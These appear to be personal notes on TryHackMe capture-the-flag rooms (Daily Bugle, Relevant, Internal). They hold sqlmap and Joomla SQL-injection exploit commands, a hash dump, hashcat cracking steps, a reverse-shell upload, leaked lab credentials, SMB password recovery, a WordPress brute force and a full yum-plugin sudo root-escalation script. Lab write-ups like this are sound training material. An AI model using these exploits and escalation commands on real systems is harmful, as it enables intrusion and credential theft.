---
title:  "2022-07-15"
tags:
  - cs/hacking
  - cs/hacking/writeup 
programming-languages:
created: 2022-07-15
---
# Daily Bugle Writeup (TryHackMe)
```bash
nmap -sV -sC 10.10.213.110
Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-15 11:59 BST
Nmap scan report for 10.10.213.110
Host is up (0.065s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 68:ed:7b:19:7f:ed:14:e6:18:98:6d:c5:88:30:aa:e9 (RSA)
|   256 5c:d6:82:da:b2:19:e3:37:99:fb:96:82:08:70:ee:9d (ECDSA)
|_  256 d2:a9:75:cf:2f:1e:f5:44:4f:0b:13:c2:0f:d7:37:cc (ED25519)
80/tcp   open  http    Apache httpd 2.4.6 ((CentOS) PHP/5.6.40)
| http-robots.txt: 15 disallowed entries 
| /joomla/administrator/ /administrator/ /bin/ /cache/ 
| /cli/ /components/ /includes/ /installation/ /language/ 
|_/layouts/ /libraries/ /logs/ /modules/ /plugins/ /tmp/
|_http-title: Home
|_http-generator: Joomla! - Open Source Content Management
|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.6.40
3306/tcp open  mysql   MariaDB (unauthorized)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 20.80 seconds
```

- CMSeek:

```
[+]  Deep Scan Results  [+] 

[✔] Target: http://10.10.213.110
[✔] Detected CMS: Joomla
[✔] CMS URL: https://joomla.org
[✔] Joomla Version: 3.7.0
[✔] Readme file: http://10.10.213.110/README.txt
[✔] Admin URL: http://10.10.213.110administrator


[✔] Open directories: 4
[*] Open directory url: 
   [>] http://10.10.213.110administrator/modules
   [>] http://10.10.213.110administrator/templates
   [>] http://10.10.213.110images/banners
   [>] http://10.10.213.110administrator/components
```

- Found vulnerability:
https://www.exploit-db.com/exploits/42033

```bash
sqlmap -u "http://<remote-ip>/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent -D joomla -T '#__users' --dump
```

Ran this script: https://github.com/XiphosResearch/exploits/tree/master/Joomblah

Which needs **python2** and the module **requests** which can be installed with `pip2`. Used this to get `pip2`: https://stackoverflow.com/questions/64187581/e-package-python-pip-has-no-installation-candidate

Result:

```bash
    .---.    .-'''-.        .-'''-.                                                           
    |   |   '   _    \     '   _    \                            .---.                        
    '---' /   /` '.   \  /   /` '.   \  __  __   ___   /|        |   |            .           
    .---..   |     \  ' .   |     \  ' |  |/  `.'   `. ||        |   |          .'|           
    |   ||   '      |  '|   '      |  '|   .-.  .-.   '||        |   |         <  |           
    |   |\    \     / / \    \     / / |  |  |  |  |  |||  __    |   |    __    | |           
    |   | `.   ` ..' /   `.   ` ..' /  |  |  |  |  |  |||/'__ '. |   | .:--.'.  | | .'''-.    
    |   |    '-...-'`       '-...-'`   |  |  |  |  |  ||:/`  '. '|   |/ |   \ | | |/.'''. \   
    |   |                              |  |  |  |  |  |||     | ||   |`" __ | | |  /    | |   
    |   |                              |__|  |__|  |__|||\    / '|   | .'.''| | | |     | |   
 __.'   '                                              |/'..' / '---'/ /   | |_| |     | |   
|      '                                               '  `'-'`       \ \._,\ '/| '.    | '.  
|____.'                                                                `--'  `" '---'   '---' 

 [-] Fetching CSRF token
 [-] Testing SQLi
  -  Found table: fb9j5_users
  -  Extracting users from fb9j5_users
 [$] Found user ['811', 'Super User', 'jonah', 'jonah@tryhackme.com', '$2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm', '', '']
  -  Extracting sessions from fb9j5_session
```

Then:

```bash
hashid crackme.txt                                                                                  4s
--File 'crackme.txt'--
Analyzing '$2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm'
[+] Blowfish(OpenBSD) 
[+] Woltlab Burning Board 4.x 
[+] bcrypt 
--End of file 'crackme.txt'--%
```

So it is a Bcrypt hash, meaning it is resistant to GPU cracking :(

I found this line to speed things up with **hashcat**:

```bash
sed -n '45000,50000p' &ltpath-to-rockyou> | hashcat -m3200 -a0 --force '&lthash>'
```

According to source:

"-   We use `sed` to extract lines 45000-50000 from the rockyou password list. These then get piped (`|`) into hashcat as possible passwords. We’re using those specific lines because I happen to know that the password is within that range, but I didn’t want to make it _too_ easy.
-   We use hashcat with `-m3200` to target a bcrypt hash, and `-a0` to specify a wordlist attack. `--force` is used to ignore warnings and break the hashes regardless. We then specify the hash to be broken — either from a file or, as in this case, from `stdin` between single quotes (`' '`). Usually at this point we would also specify a wordlist, but we’re using the output of the `sed` command this time."

- Standard **hashcat**:
```bash
hashcat -m3200 -a0 --force '<hash>' <path-to-rockyou>
```

SQLMap is taking a while and to no avail so far.

Can update files in `Extensions -> Templates -> Templates` using the username (jonah) and password retrieved:

```
$2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm:spiderman123
Session..........: hashcat
Status...........: Cracked
Hash.Name........: bcrypt $2*$, Blowfish (Unix)
Hash.Target......: $2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p...BtZutm
Time.Started.....: Fri Jul 15 12:25:08 2022, (1 min, 52 secs)
Time.Estimated...: Fri Jul 15 12:27:00 2022, (0 secs)
Guess.Base.......: Pipe
Speed.#1.........:       16 H/s (7.64ms) @ Accel:1 Loops:128 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests
Progress.........: 1834
Rejected.........: 0
Restore.Point....: 0
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:896-1024
Candidates.#1....: spiderman123 -> spiderman123
Started: Fri Jul 15 12:24:27 2022
Stopped: Fri Jul 15 12:27:02 2022
```

We get a reverse shell and upload it: https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php

Create a php file then edit it with the shell.

We can find a weird `configuration.php` file in `/var/www/html`.

```bash
public $offline = '0';
	public $offline_message = 'This site is down for maintenance.<br />Please check back again soon.';
	public $display_offline_message = '1';
	public $offline_image = '';
	public $sitename = 'The Daily Bugle';
	public $editor = 'tinymce';
	public $captcha = '0';
	public $list_limit = '20';
	public $access = '1';
	public $debug = '0';
	public $debug_lang = '0';
	public $dbtype = 'mysqli';
	public $host = 'localhost';
	public $user = 'root';
	public $password = 'nv5uz9r3ZEDzVjNu';
	public $db = 'joomla';
	public $dbprefix = 'fb9j5_';
	public $live_site = '';
	public $secret = 'UAMBRWzHO3oFPmVC';
	public $gzip = '0';
	public $error_reporting = 'default';
	public $helpurl = 'https://help.joomla.org/proxy/index.php?keyref=Help{major}{minor}:{keyref}';
	public $ftp_host = '127.0.0.1';
	public $ftp_port = '21';
	public $ftp_user = '';
	public $ftp_pass = '';
	public $ftp_root = '';
	public $ftp_enable = '0';
	public $offset = 'UTC';
	public $mailonline = '1';
	public $mailer = 'mail';
	public $mailfrom = 'jonah@tryhackme.com';
	public $fromname = 'The Daily Bugle';
	public $sendmail = '/usr/sbin/sendmail';
	public $smtpauth = '0';
	public $smtpuser = '';
	public $smtppass = '';
	public $smtphost = 'localhost';
	public $smtpsecure = 'none';
	public $smtpport = '25';
	public $caching = '0';
	public $cache_handler = 'file';
	public $cachetime = '15';
	public $cache_platformprefix = '0';
	public $MetaDesc = 'New York City tabloid newspaper';
	public $MetaKeys = '';
	public $MetaTitle = '1';
	public $MetaAuthor = '1';
	public $MetaVersion = '0';
	public $robots = '';
	public $sef = '1';
	public $sef_rewrite = '0';
	public $sef_suffix = '0';
	public $unicodeslugs = '0';
	public $feed_limit = '10';
	public $feed_email = 'none';
	public $log_path = '/var/www/html/administrator/logs';
	public $tmp_path = '/var/www/html/tmp';
	public $lifetime = '15';
	public $session_handler = 'database';
	public $shared_session = '0';
```

Then used this to get to root:

```bash
TF=$(mktemp -d)
cat >$TF/x<<EOF
[main]
plugins=1
pluginpath=$TF
pluginconfpath=$TF
EOF

cat >$TF/y.conf<<EOF
[main]
enabled=1
EOF

cat >$TF/y.py<<EOF
import os
import yum
from yum.plugins import PluginYumExit, TYPE_CORE, TYPE_INTERACTIVE
requires_api_version='2.1'
def init_hook(conduit):
  os.execl('/bin/sh','/bin/sh')
EOF

sudo yum -c $TF/x --enableplugin=y
```

---

- HashCat examples: https://hashcat.net/wiki/doku.php?id=example_hashes

## Relevant (TryHackMe)
First I enumerated:

```bash
nmap -sV -sC 10.10.169.49                                                                                                                                                                                                   INT
Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-15 13:14 BST
Nmap scan report for 10.10.169.49
Host is up (0.064s latency).
Not shown: 995 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
| http-methods: 
|_  Potentially risky methods: TRACE
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds  Windows Server 2016 Standard Evaluation 14393 microsoft-ds
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: RELEVANT
|   NetBIOS_Domain_Name: RELEVANT
|   NetBIOS_Computer_Name: RELEVANT
|   DNS_Domain_Name: Relevant
|   DNS_Computer_Name: Relevant
|   Product_Version: 10.0.14393
|_  System_Time: 2022-07-15T12:15:10+00:00
| ssl-cert: Subject: commonName=Relevant
| Not valid before: 2022-07-14T12:13:29
|_Not valid after:  2023-01-13T12:13:29
|_ssl-date: 2022-07-15T12:15:50+00:00; 0s from scanner time.
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2022-07-15T12:15:14
|_  start_date: 2022-07-15T12:13:48
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard Evaluation 14393 (Windows Server 2016 Standard Evaluation 6.3)
|   Computer name: Relevant
|   NetBIOS computer name: RELEVANT\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2022-07-15T05:15:13-07:00
|_clock-skew: mean: 1h24m00s, deviation: 3h07m51s, median: 0s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 54.07 seconds
```

Then checked the shares in SMB:

```bash
smbclient -L 10.10.169.49                                                                                                                                                                                                   54s
Enter WORKGROUP\hanato's password: 

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
	nt4wrksv        Disk      
SMB1 disabled -- no workgroup available
```

Can access `nt4wrksv`:

```
smbclient \\\\10.10.169.49\\nt4wrksv
Enter WORKGROUP\hanato's password: 
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Sat Jul 25 22:46:04 2020
  ..                                  D        0  Sat Jul 25 22:46:04 2020
  passwords.txt                       A       98  Sat Jul 25 16:15:33 2020

		7735807 blocks of size 4096. 4948471 blocks available
```

They look like this:

```bash
cat passwords.txt 
[User Passwords - Encoded]
Qm9iIC0gIVBAJCRXMHJEITEyMw==
QmlsbCAtIEp1dzRubmFNNG40MjA2OTY5NjkhJCQk
```

And seem to be base64, so we decode:

```bash
echo Qm9iIC0gIVBAJCRXMHJEITEyMw== | base64 -d             
Bob - !P@$$W0rD!123%
echo QmlsbCAtIEp1dzRubmFNNG40MjA2OTY5NjkhJCQk | base64 -d
Bill - Juw4nnaM4n420696969!$$$
```

## Internal (TryHackMe)
```bash
[+] Performing password attack on Xmlrpc against 1 user/s
[SUCCESS] - admin / my2boys                                                                                                                                                                                                                   
Trying admin / marianita Time: 00:01:15 <                                                                                                                                                            > (3900 / 14348292)  0.02%  ETA: ??:??:??

[!] Valid Combinations Found:
 | Username: admin, Password: my2boys
```

## Buffer Overflow Prep (TryHackMe)
